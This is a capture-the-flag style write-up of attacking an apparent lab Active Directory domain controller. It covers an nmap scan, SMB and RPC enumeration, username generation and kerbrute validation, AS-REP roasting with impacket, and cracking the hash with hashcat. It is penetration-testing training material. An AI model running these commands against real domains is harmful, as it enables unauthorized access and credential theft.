I started with a `nmap` scan:

```bash
# Nmap 7.95 scan initiated Tue Dec 23 12:05:00 2025 as: /usr/lib/nmap/nmap -Pn -sV -sC -v -oN nmap_sVsC.txt 10.67.183.91
Nmap scan report for 10.67.183.91
Host is up (0.13s latency).
Not shown: 986 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-favicon: Unknown favicon MD5: FED84E16B6CCFE88EE7FFAAE5DFEFD34
|_http-title: eBusiness Bootstrap Template
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-12-23 17:05:26Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: fusion.corp0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: fusion.corp0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=Fusion-DC.fusion.corp
| Issuer: commonName=Fusion-DC.fusion.corp
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-12-22T16:46:03
| Not valid after:  2026-06-23T16:46:03
| MD5:   de6b:9151:81c3:f32d:0726:e75a:2405:f376
|_SHA-1: 857e:fe36:2cae:42ec:0925:e48f:a68c:15d8:b200:e053
| rdp-ntlm-info: 
|   Target_Name: FUSION
|   NetBIOS_Domain_Name: FUSION
|   NetBIOS_Computer_Name: FUSION-DC
|   DNS_Domain_Name: fusion.corp
|   DNS_Computer_Name: Fusion-DC.fusion.corp
|   Product_Version: 10.0.17763
|_  System_Time: 2025-12-23T17:05:35+00:00
|_ssl-date: 2025-12-23T17:06:13+00:00; -1s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: FUSION-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-12-23T17:05:38
|_  start_date: N/A

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Dec 23 12:06:18 2025 -- 1 IP address (1 host up) scanned in 77.86 seconds
```

From the results, I understand that this is a Domain Controller. Also, I see that there is a port 80 running so I go to visit the website.

I run `gobuster` to find interesting directories but I didn't find anything useful:

![](attachments/Pasted%20image%2020251223193332.png)

I run:
```bash
netexec smb $target
```
to find the name of the domain:

![](attachments/Pasted%20image%2020251223193504.png)

and I added it to the `/etc/hosts`

My goal was to find usernames so I tried a couple of things with `netexec` with no avail:

![](attachments/Pasted%20image%2020251223193717.png)

I was able to get a anonymous login to `RPC` but I could not enumerate the users:

![](attachments/Pasted%20image%2020251223193932.png)

As I was browsing the site I found this segment with the names of the employees:

![](attachments/Pasted%20image%2020251223202834.png)

So I copy-pasted their names in a file called `names.txt` and then I used a program from Github (https://github.com/mohinparamasivam/AD-Username-Generator) to generate possible AD usernames from their names.

```bash
python3 username-generator.py -u names.txt -o generated_users.txt
```

After that I tried to `kerbrute` to see which usernames were valid:

```bash
kerbrute userenum usernames.txt --dc $target -d fusion.corp
```

but I didn't find any valid username.

Searching a little more, I found a file called `employees.ods` and then I opened it with `libreoffice` and I found a lot of usernames:

![](attachments/Pasted%20image%2020251223203804.png)

I copied them to the `usernames.txt` and then I run `kerbrute` again:

![](attachments/Pasted%20image%2020251223204054.png)

Then I checked for AsrepRoasting attack and I was able to find a hash:
```bash
impacket-GetNPUsers fusion.corp/ -dc-ip $target -usersfile usernames.txt -outputfile hashes.txt
```

![](attachments/Pasted%20image%2020251223204712.png)

which I cracked:
```bash
hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt
```

![](attachments/Pasted%20image%2020251223205103.png)

I checked for `Kerberoasting` but it didn't work:

![](attachments/Pasted%20image%2020251223210221.png)


